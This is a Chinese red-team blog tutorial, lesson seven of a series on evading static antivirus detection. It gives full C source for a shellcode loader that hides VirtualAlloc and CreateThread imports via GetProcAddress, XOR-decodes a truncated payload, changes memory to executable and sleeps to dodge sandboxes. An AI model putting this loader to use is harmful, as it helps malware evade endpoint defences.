@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>静态恶意代码逃逸（第七课） « 倾旋的博客</title>
+  <meta name="description" content="代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode0x01 导入地址表（IAT）  Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="https://payloads.online/archivers/2020-10-23/1">
+  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
+</head>
+
+
+  <body>
+
+    <div class="header-placeholder"></div>
+<header class="header">
+  <div class="wrapper">
+    <div id="sidebar-toggle">TOC</div>
+    <a class="site-title" href="/">倾旋的博客</a>
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">About</a>
+      
+        
+        <a class="page-link" href="/posts/">Posts</a>
+      
+        
+        <a class="page-link" href="/links/">Links</a>
+      
+        
+        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
+      
+        
+        <a class="page-link" href="/feed.xml">RSS</a>
+      
+    </nav>
+  </div>
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <div class="col-main">
+          <div class="post">
+
+  <header class="post-header">
+    <h1 class="post-title">静态恶意代码逃逸（第七课）</h1>
+    <p class="post-meta">Oct 23, 2020</p>
+  </header>
+
+  <article class="post-content">
+    <p>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode</p>
+
+<h2 id="0x01-导入地址表iat">0x01 导入地址表（IAT）</h2>
+
+<blockquote>
+  <p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</p>
+</blockquote>
+
+<p>如下图所示：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e28c535df916bd93fd477be050ac55e3.png" alt="2020-10-23-10-46-14"></p>
+
+<p>在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。</p>
+
+<p>站在反病毒的角度提出假想：既然所有的PE文件都有导入表，并且声明了一些模块，并且还能通过模块找到导入函数的名称，那么是否能够作为一个文件的风险值的评估方向？</p>
+
+<p>方法论：</p>
+
+<p>如果一个文件的文件大小在300KB以内，并且导入函数又有<code class="language-plaintext highlighter-rouge">Virtual Alloc</code>、<code class="language-plaintext highlighter-rouge">CreateThread</code>，且<code class="language-plaintext highlighter-rouge">VirtualAlloc</code>的最后一个参数是<code class="language-plaintext highlighter-rouge">0x40</code>，那么此文件是高危文件。</p>
+
+<p><code class="language-plaintext highlighter-rouge">0x40</code>被定义在<code class="language-plaintext highlighter-rouge">winnt.h</code>中：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define PAGE_NOACCESS           0x01    
+#define PAGE_READONLY           0x02    
+#define PAGE_READWRITE          0x04    
+#define PAGE_WRITECOPY          0x08    
+#define PAGE_EXECUTE            0x10    
+#define PAGE_EXECUTE_READ       0x20    
+#define PAGE_EXECUTE_READWRITE  0x40    
+#define PAGE_EXECUTE_WRITECOPY  0x80  
+</span></code></pre></div></div>
+
+<p>看一下<a href="https://github.com/Rvn0xsy/BadCode/blob/master/BadCode/Source.cpp">第一课代码</a>编译出来的PE导出表：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b0f5ee9273dac92263fb6ebc737d5608.png" alt="2020-10-23-11-13-58"></p>
+
+<p>根据这个猜想，我们开始尝试在PE文件中抹去导入函数名称。</p>
+
+<h2 id="0x02-getprocaddress获取函数地址">0x02 GetProcAddress获取函数地址</h2>
+
+<p><code class="language-plaintext highlighter-rouge">GetProcAddress</code>这个API在Kernel32.dll中被导出，主要功能是从一个加载的模块中获取函数的地址。</p>
+
+<p>函数声明如下：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FARPROC</span> <span class="nf">GetProcAddress</span><span class="p">(</span>
+  <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="c1">// 模块句柄</span>
+  <span class="n">LPCSTR</span>  <span class="n">lpProcName</span> <span class="c1">// 函数名称</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">FARPROC</code>被定义在了<code class="language-plaintext highlighter-rouge">minwindef.h</code>中，声明如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define WINAPI      __stdcall
+</span>
+<span class="k">typedef</span> <span class="nf">int</span> <span class="p">(</span><span class="n">FAR</span> <span class="n">WINAPI</span> <span class="o">*</span><span class="n">FARPROC</span><span class="p">)();</span>
+</code></pre></div></div>
+
+<p>跟进它的声明能够发现是一个函数指针，也就是说<code class="language-plaintext highlighter-rouge">GetProcAddress</code>返回的是我们要找的函数地址。</p>
+
+<h2 id="0x03-自己动手获取函数地址">0x03 自己动手获取函数地址</h2>
+
+<p>我们拿<a href="https://github.com/Rvn0xsy/BadCode/tree/master/BadCode">第一课的代码</a>来尝试修改。</p>
+
+<p>分析<a href="https://github.com/Rvn0xsy/BadCode/blob/master/BadCode/Source.cpp">第一课的代码</a>，主要流程：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject
+</code></pre></div></div>
+
+<p>这几个函数是比较明显的，并且都在<code class="language-plaintext highlighter-rouge">kernel32.dll</code>中导出，我们尝试自己定义他们的函数指针，然后利用<code class="language-plaintext highlighter-rouge">GetProcAddress</code>获取函数地址，调用自己的函数名称。</p>
+
+<p>新建一个<code class="language-plaintext highlighter-rouge">C/C++</code>项目，定义如下：</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">LPVOID</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportVirtualAlloc</span><span class="p">)(</span>
+	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flProtect</span>
+	<span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">HANDLE</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportCreateThread</span><span class="p">)(</span>
+	<span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
+	<span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
+	<span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
+	<span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
+	<span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
+	<span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span><span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportVirtualProtect</span><span class="p">)(</span>
+	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
+	<span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
+	<span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">ImportWaitForSingleObject</span><span class="p">)(</span>
+  <span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span>
+  <span class="n">DWORD</span>  <span class="n">dwMilliseconds</span>
+<span class="p">);</span>
+</code></pre></div></div>
+
+<p>然后在<code class="language-plaintext highlighter-rouge">main</code>函数中，定义四个函数指针来存放这些函数的地址。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ImportVirtualAlloc</span> <span class="n">MyVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportVirtualAlloc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
+	<span class="n">ImportCreateThread</span> <span class="n">MyCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportCreateThread</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"CreateThread"</span><span class="p">);</span>
+	<span class="n">ImportVirtualProtect</span> <span class="n">MyVirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportVirtualProtect</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+	<span class="n">ImportWaitForSingleObject</span> <span class="n">MyWaitForSingleObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportWaitForSingleObject</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"WaitForSingleObject"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>完整代码如下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+#include &lt;intrin.h&gt;
+#include &lt;WinBase.h&gt;
+#include &lt;stdio.h&gt;
+</span>
+<span class="k">typedef</span> <span class="nf">LPVOID</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportVirtualAlloc</span><span class="p">)(</span>
+	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flProtect</span>
+	<span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">HANDLE</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportCreateThread</span><span class="p">)(</span>
+	<span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
+	<span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
+	<span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
+	<span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
+	<span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
+	<span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span><span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportVirtualProtect</span><span class="p">)(</span>
+	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
+	<span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
+	<span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">DWORD</span><span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">ImportWaitForSingleObject</span><span class="p">)(</span>
+	<span class="n">HANDLE</span> <span class="n">hHandle</span><span class="p">,</span>
+	<span class="n">DWORD</span>  <span class="n">dwMilliseconds</span>
+	<span class="p">);</span>
+
+
+
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+	<span class="n">ImportVirtualAlloc</span> <span class="n">MyVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportVirtualAlloc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
+	<span class="n">ImportCreateThread</span> <span class="n">MyCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportCreateThread</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"CreateThread"</span><span class="p">);</span>
+	<span class="n">ImportVirtualProtect</span> <span class="n">MyVirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportVirtualProtect</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+	<span class="n">ImportWaitForSingleObject</span> <span class="n">MyWaitForSingleObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">ImportWaitForSingleObject</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)),</span> <span class="s">"WaitForSingleObject"</span><span class="p">);</span>
+
+
+	<span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+	<span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+	<span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+	<span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xf6\xe2\x83\x0a\x0a\x0a\x6a</span><span class="s">..."</span><span class="p">;</span>
+
+
+	<span class="c1">// 获取shellcode大小</span>
+	<span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="cm">/* 增加异或代码 */</span>
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">shellcode_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="c1">//Sleep(50);</span>
+		<span class="n">_InterlockedXor8</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="cm">/*
+	VirtualAlloc(
+		NULL, // 基址
+		800,  // 大小
+		MEM_COMMIT, // 内存页状态
+		PAGE_EXECUTE_READWRITE // 可读可写可执行
+		);
+	*/</span>
+
+	<span class="kt">char</span><span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">MyVirtualAlloc</span><span class="p">(</span>
+		<span class="nb">NULL</span><span class="p">,</span>
+		<span class="n">shellcode_size</span><span class="p">,</span>
+		<span class="n">MEM_COMMIT</span><span class="p">,</span>
+		<span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+	<span class="p">);</span>
+
+	<span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+	<span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
+
+	<span class="c1">// 这里开始更改它的属性为可执行</span>
+	<span class="n">MyVirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+
+	<span class="c1">// 等待几秒，兴许可以跳过某些沙盒呢？</span>
+	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
+
+	<span class="n">hThread</span> <span class="o">=</span> <span class="n">MyCreateThread</span><span class="p">(</span>
+		<span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+		<span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+		<span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+		<span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+		<span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+		<span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+	<span class="p">);</span>
+
+	<span class="n">MyWaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>编译后能够正常执行，并且我们查看一下导入表，我们自己定义的函数已经不在导入表中了：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/ee11ce9cb8b0e9f163240ec6f03b549c.png" alt="2020-10-23-11-26-45"></p>
+
+<p><a href="https://www.virustotal.com/gui/file/6e46cbe74a6d82747d2eb057d49b449477ab9c5e7bc6a7be295cbe7c09d5a7e4/detection">Virus Total</a>一下看看：</p>
+
+<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d0b832e644e41e56e5de675f1cda99c2.png" alt="2020-10-23-11-30-16"></p>
+
+<p>目前这个程序仅仅只是在一个函数中进行调用，并且还有字符串硬编码的问题，下一课着重分享如何解决字符串硬编码的问题。</p>
+
+  </article>
+  
+  
+
+
+
+
+</div>
+
+        </div>
+        <div class="col-second">
+          <div class="col-box col-box-author">
+  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
+  <div class="col-box-title name">倾旋</div>
+  <p>特点：爪子长、个子高、身体瘦弱
+</p>
+  <p class="contact">
+    
+    <a href="https://github.com/Rvn0xsy">GitHub</a>
+    
+    
+    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
+    
+    
+    <a href="mailto:rvn0xsy@gmail.com">Email</a>
+    
+    <a href="#">微信</a>
+    
+  </p>
+</div>
+
+<div class="col-box">
+  <div class="col-box-title">Newest Posts</div>
+  <ul class="post-list">
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
+    
+      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
+    
+    <li><a class="post-link" href="/posts/">更多....</a></li>
+  </ul>
+</div>
+
+<div class="col-box post-toc hide">
+  <div class="col-box-title">TOC</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+<div class="wrapper">
+© 2021 倾旋
+</div>
+</footer>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-158746438-1');
+</script>
+
+<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
+<script src="/js/easybook.js"></script>
+
+
+  </body>
+
+</html>
